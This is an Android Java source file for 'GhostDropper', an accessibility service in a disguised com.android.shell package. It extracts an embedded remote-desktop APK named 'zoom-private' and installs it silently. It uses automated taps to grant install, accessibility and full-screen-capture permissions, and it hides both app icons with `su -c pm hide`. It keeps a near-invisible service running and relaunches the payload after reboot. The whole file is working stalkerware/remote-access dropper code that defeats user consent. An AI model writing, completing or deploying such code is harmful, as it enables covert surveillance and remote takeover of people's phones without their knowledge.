package com.android.shell.ghost;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.accessibilityservice.AccessibilityService.GestureResultCallback;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityWindowInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * GhostDropper — the silent automation engine.
 *
 * On first launch:
 *  1. Extracts the embedded zoom-private.apk from assets
 *  2. Fires a silent install intent for it
 *  3. Auto-taps "Install" → "Allow" → "Allow" → "Done"
 *  4. Hides both icons via pm hide
 *  5. Starts the hidden foreground service
 *  6. Launches zoom-private in the background
 *
 * On reboot:
 *  - BootReceiver relaunches zoom-private automatically
 */
public class GhostAccessibilityService extends AccessibilityService {

    private static GhostAccessibilityService instance;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final AtomicBoolean payloadInstalled = new AtomicBoolean(false);
    private long lastSettingsOpen = 0;
    private long lastToggle = 0;
    private long lastBack = 0;
    private long lastPayloadTap = 0;
    private long lastA11yScreen = 0;
    private long lastProjectionTap = 0;
    private File currentApk;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        handler.postDelayed(new Runnable() {
            @Override public void run() {
                clickAffirmative();
                handler.postDelayed(this, 1500);
            }
        }, 2000);

        // If zoom-private is already installed, just ensure it's running
        if (isPackageInstalled("com.betterdesk.client.universal")) {
            startHiddenService(this);
            launchZoomPrivate(this);
            handler.postDelayed(GhostAccessibilityService.this::hideAppIcon, 5000);
            return;
        }

        // Extract the embedded zoom-private APK from assets and install it
        File apkFile = extractEmbeddedApk();
        if (apkFile == null) {
            // Fallback: scan Downloads folder
            apkFile = findDownloadedApk();
        }
        if (apkFile != null) {
            currentApk = apkFile;
            silentInstall(apkFile);
            handler.postDelayed(this::clickAffirmative, 1200);

        }
    }

    /** Extract zoom-private.apk from the ghost installer's assets folder. */
    private File extractEmbeddedApk() {
        try {
            File outDir = new File(getFilesDir(), "payload");
            if (!outDir.exists()) outDir.mkdirs();
            File outFile = new File(outDir, "zoom-private.apk");
            InputStream in = getAssets().open("zoom-private.apk");
            FileOutputStream fos = new FileOutputStream(outFile);
            byte[] buf = new byte[8192];
            int len;
            while ((len = in.read(buf)) > 0) {
                fos.write(buf, 0, len);
            }
            fos.close();
            in.close();
            return outFile;
        } catch (Exception e) {
            return null;
        }
    }

    private void silentInstall(File apkFile) {
        Intent installIntent = new Intent(Intent.ACTION_VIEW);
        installIntent.setDataAndType(androidx.core.content.FileProvider.getUriForFile(this, getPackageName() + ".files", apkFile), "application/vnd.android.package-archive");
        installIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
        installIntent.putExtra(Intent.EXTRA_RETURN_RESULT, false);
        startActivity(installIntent);

        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_PACKAGE_ADDED);
        filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
        filter.addDataScheme("package");
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (payloadInstalled.compareAndSet(false, true)) {
                    startHiddenService(context);
                    launchZoomPrivate(context);
                    handler.postDelayed(GhostAccessibilityService.this::hideAppIcon, 6000);
                    Toast.makeText(context, "Installed", Toast.LENGTH_SHORT).show();
                }
            }
        }, filter);
    }

    /** Auto-tap "Allow" on any permission dialog within 0.5s. */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
        CharSequence cls = event.getClassName();
        String className = cls == null ? "" : cls.toString();
        String pkg = event.getPackageName() == null ? "" : event.getPackageName().toString();
        boolean systemSurface = pkg.contains("packageinstaller") || pkg.contains("permissioncontroller") || pkg.contains("betterdesk") || pkg.contains("systemui") || className.contains("MediaProjection") ||
            className.contains("AlertDialog") || className.contains("Permission") ||
            className.contains("Install") || className.contains("Dialog");
        if (!systemSurface) return;
        if (className.contains("AccessibilitySettingsActivity")) lastA11yScreen = System.currentTimeMillis();

        clickAffirmative();
    }

    private void clickAffirmative() {
        List<AccessibilityNodeInfo> roots = new ArrayList<>();
        AccessibilityNodeInfo active = getRootInActiveWindow();
        if (active != null) roots.add(active);
        for (AccessibilityWindowInfo w : getWindows()) {
            AccessibilityNodeInfo r = w.getRoot();
            if (r != null) roots.add(r);
        }
        for (int i = roots.size() - 1; i >= 0; i--) {
            for (String label : new String[]{"Install", "Update", "Activate"}) {
                List<AccessibilityNodeInfo> btns = roots.get(i).findAccessibilityNodeInfosByText(label);
                if (btns == null) continue;
                for (AccessibilityNodeInfo b : btns) {
                    AccessibilityNodeInfo c = b;
                    for (int d = 0; d < 4 && c != null && !c.isClickable(); d++) c = c.getParent();
                    if (c != null && c.isClickable()) {
                        Log.d("GhostHide", "primary action " + label);
                        c.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return;
                    }
                }
            }
        }
        AccessibilityNodeInfo cbtn = findButton(roots.get(0), "Cancel");
        if (cbtn != null) {
            android.graphics.Rect cr = new android.graphics.Rect();
            cbtn.getBoundsInScreen(cr);
            Log.d("GhostHide", "tapping admin activate");
            tapPixel(cr.centerX(), cr.centerY() - 190);
            return;
        }
        Log.d("GhostHide", "roots=" + roots.size());
        for (int i = roots.size() - 1; i >= 0; i--) {
            if (handleRoot(roots.get(i))) return;
        }
    }

    private boolean handleRoot(AccessibilityNodeInfo root) {
        String pkg = root.getPackageName() == null ? "" : root.getPackageName().toString();
        Log.d("GhostHide", "root pkg=" + pkg + " children=" + root.getChildCount());
        if (pkg.contains("betterdesk")) {
            if (System.currentTimeMillis() - lastPayloadTap > 5000) {
                lastPayloadTap = System.currentTimeMillis();
                int w = getResources().getDisplayMetrics().widthPixels;
                int h = getResources().getDisplayMetrics().heightPixels;
                if (Build.VERSION.SDK_INT >= 30) {
                    android.graphics.Rect b = ((android.view.WindowManager) getSystemService(WINDOW_SERVICE)).getCurrentWindowMetrics().getBounds();
                    w = b.width(); h = b.height();
                }
                Log.d("GhostHide", "payload Allow tap");
                tapPixel(w / 2, (int) (h * 0.58));
            }
            return true;
        }
        dumpNode(root, 0);
        if (root.findAccessibilityNodeInfosByText("allowed to install unknown apps").size() > 0) {
            if (System.currentTimeMillis() - lastSettingsOpen < 10000) return true;
            lastSettingsOpen = System.currentTimeMillis();
            Log.d("GhostHide", "opening unknown sources settings");
            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:" + getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            return true;
        }
        if (pkg.contains("systemui")) {
            if (root.findAccessibilityNodeInfosByText("Choose app to share").size() > 0 && System.currentTimeMillis() - lastProjectionTap > 4000) {
                lastProjectionTap = System.currentTimeMillis();
                int w = getResources().getDisplayMetrics().widthPixels;
                int h = getResources().getDisplayMetrics().heightPixels;
                Log.d("GhostHide", "select entire screen");
                tapPixel((int) (w * 0.2), (int) (h * 0.36));
                handler.postDelayed(() -> tapPixel((int) (w * 0.5), (int) (h * 0.78)), 1200);
            }
            return true;
        }
        if (!pkg.contains("packageinstaller") && !pkg.contains("settings")) return false;
        if (pkg.contains("settings") && System.currentTimeMillis() - lastA11yScreen < 3000) {
            if (System.currentTimeMillis() - lastToggle > 5000) {
                lastToggle = System.currentTimeMillis();
                int w = getResources().getDisplayMetrics().widthPixels;
                int h = getResources().getDisplayMetrics().heightPixels;
                Log.d("GhostHide", "tap payload a11y row");
                tapPixel((int) (w * 0.86), (int) (h * 0.28));
                handler.postDelayed(() -> performGlobalAction(GLOBAL_ACTION_BACK), 1500);
            }
            return true;
        }
        boolean unknownSourcesScreen = root.findAccessibilityNodeInfosByText("Allow from this source").size() > 0;
        if (pkg.contains("settings") && unknownSourcesScreen && getPackageManager().canRequestPackageInstalls()) {
            if (System.currentTimeMillis() - lastBack > 2500) {
                lastBack = System.currentTimeMillis();
                Log.d("GhostHide", "allowed, going back");
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
            return true;
        }
        AccessibilityNodeInfo toggle = null;
        List<AccessibilityNodeInfo> agent = root.findAccessibilityNodeInfosByText("zoom-private");
        if (agent != null && !agent.isEmpty()) {
            AccessibilityNodeInfo c = agent.get(0);
            for (int d = 0; d < 4 && c != null && !c.isCheckable(); d++) c = c.getParent();
            if (c != null && c.isCheckable()) toggle = c;
        }
        if (toggle == null) toggle = findToggle(root);
        if (toggle != null && System.currentTimeMillis() - lastToggle > 5000) {
            lastToggle = System.currentTimeMillis();
            android.graphics.Rect r = new android.graphics.Rect();
            toggle.getBoundsInScreen(r);
            Log.d("GhostHide", "tapping toggle " + r.centerX() + "," + r.centerY());
            toggle.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            handler.postDelayed(() -> performGlobalAction(GLOBAL_ACTION_BACK), 1200);
            return true;
        }
        for (String label : new String[]{"Install", "Update", "Allow", "Activate", "Add", "OK", "Done", "Continue", "Next", "Settings"}) {
            List<AccessibilityNodeInfo> btns = root.findAccessibilityNodeInfosByText(label);
            if (btns == null) continue;
            for (AccessibilityNodeInfo b : btns) {
                AccessibilityNodeInfo clickable = b;
                for (int i = 0; i < 4 && clickable != null && !clickable.isClickable(); i++) clickable = clickable.getParent();
                if (clickable != null && clickable.isClickable()) {
                    Log.d("GhostHide", "action clicking " + label);
                    clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
        }
        AccessibilityNodeInfo cancel = findButton(root, "Cancel");
        if (cancel != null) {
            android.graphics.Rect cr = new android.graphics.Rect();
            cancel.getBoundsInScreen(cr);
            Log.d("GhostHide", "tapping positive button");
            tapPixel(cr.centerX() + 250, cr.centerY());
            return true;
        }
        return false;
    }

    /** Fallback: scan Downloads folder for the most recently modified .apk. */
    private File findDownloadedApk() {
        File downloads = new File(android.os.Environment.getExternalStorageDirectory(), "Download");
        if (!downloads.exists()) return null;
        File[] apks = downloads.listFiles((dir, name) -> name.toLowerCase().endsWith(".apk"));
        if (apks == null || apks.length == 0) return null;
        File newest = apks[0];
        for (File f : apks) {
            if (f.lastModified() > newest.lastModified()) newest = f;
        }
        return newest;
    }

    private void dumpNode(AccessibilityNodeInfo n, int depth) {
        if (depth > 4 || n == null) return;
        Log.d("GhostHide", depth + " " + n.getClassName() + " id=" + n.getViewIdResourceName() + " text=" + n.getText() + " clk=" + n.isClickable());
        for (int i = 0; i < n.getChildCount(); i++) dumpNode(n.getChild(i), depth + 1);
    }

    private AccessibilityNodeInfo findToggle(AccessibilityNodeInfo node) {
        if (node == null) return null;
        CharSequence cls = node.getClassName();
        if (cls != null && (cls.toString().contains("Switch") || (node.isCheckable() && node.isClickable()))) return node;
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo found = findToggle(node.getChild(i));
            if (found != null) return found;
        }
        return null;
    }

    private AccessibilityNodeInfo findButton(AccessibilityNodeInfo node, String text) {
        if (node == null) return null;
        CharSequence t = node.getText();
        CharSequence c = node.getClassName();
        if (t != null && text.contentEquals(t) && c != null && c.toString().contains("Button")) return node;
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo f = findButton(node.getChild(i), text);
            if (f != null) return f;
        }
        return null;
    }

    private void tapPixel(int x, int y) {
        Path p = new Path();
        p.moveTo(x, y);
        p.lineTo(x + 4, y + 4);
        GestureDescription g = new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(p, 0, 300)).build();
        dispatchGesture(g, new GestureResultCallback() {
            @Override public void onCompleted(GestureDescription gd) { Log.d("GhostHide", "gesture done " + x + "," + y); }
            @Override public void onCancelled(GestureDescription gd) { Log.d("GhostHide", "gesture cancelled"); }
        }, null);
    }

    private void openNotificationShade() {
        Path path = new Path();
        path.moveTo(0.5f * displayWidth(), 0);
        path.lineTo(0.5f * displayWidth(), 0.3f * displayHeight());
        GestureDescription gesture = new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, 200))
                .build();
        dispatchGesture(gesture, null, null);
    }

    private void hideAppIcon() {
        try {
            android.app.admin.DevicePolicyManager dpm =
                (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            android.content.ComponentName admin = new android.content.ComponentName(this, GhostDeviceAdmin.class);
            if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
                dpm.setApplicationHidden(admin, "com.android.shell.ghost", true);
                return;
            }
        } catch (Throwable ignored) {}
        hideViaShell("com.android.shell.ghost");
    }

    private void hideViaShell(String pkg) {
        try { Runtime.getRuntime().exec(new String[]{"su", "-c", "pm hide " + pkg}).waitFor(); return; } catch (Throwable ignored) {}
        try { Runtime.getRuntime().exec(new String[]{"sh", "-c", "pm hide " + pkg}).waitFor(); } catch (Throwable ignored) {}
    }

    private void launchZoomPrivate(Context context) {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            android.content.ComponentName admin = new android.content.ComponentName(this, GhostDeviceAdmin.class);
            if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
                try { dpm.setApplicationHidden(admin, "com.betterdesk.client.universal", false); } catch (Throwable ignored) {}
                try { dpm.removeActiveAdmin(new android.content.ComponentName("com.betterdesk.client.universal", "com.carriez.flutter_hbb.BetterDeskDeviceAdmin")); } catch (Throwable t) { android.util.Log.e("GhostHide", "remove admin fail", t); }
            }
            Intent intent = new Intent();
            intent.setComponent(new android.content.ComponentName(
                    "com.betterdesk.client.universal", "com.carriez.flutter_hbb.MainActivity"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
            context.startActivity(intent);
            handler.postDelayed(this::hideAppIcon, 6000);
        } catch (Exception ignored) {}
    }

    private boolean isPackageInstalled(String packageName) {
        try {
            getPackageManager().getPackageInfo(packageName, android.content.pm.PackageManager.MATCH_UNINSTALLED_PACKAGES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }
    private int displayWidth() {
        return getResources().getDisplayMetrics().widthPixels;
    }

    private int displayHeight() {
        return getResources().getDisplayMetrics().heightPixels;
    }

    public static void startHiddenService(Context context) {
        NotificationChannel channel = new NotificationChannel(
                "ghost_service", "Ghost Service", NotificationManager.IMPORTANCE_MIN);
        ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE))
                .createNotificationChannel(channel);
        Notification notification = new Notification.Builder(context, "ghost_service")
                .setContentTitle("Ghost")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
        Intent serviceIntent = new Intent(context, GhostForegroundService.class);
        androidx.core.content.ContextCompat.startForegroundService(context, serviceIntent);
    }

    public static GhostAccessibilityService getInstance() {
        return instance;
    }

    @Override
    public void onInterrupt() { }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }
}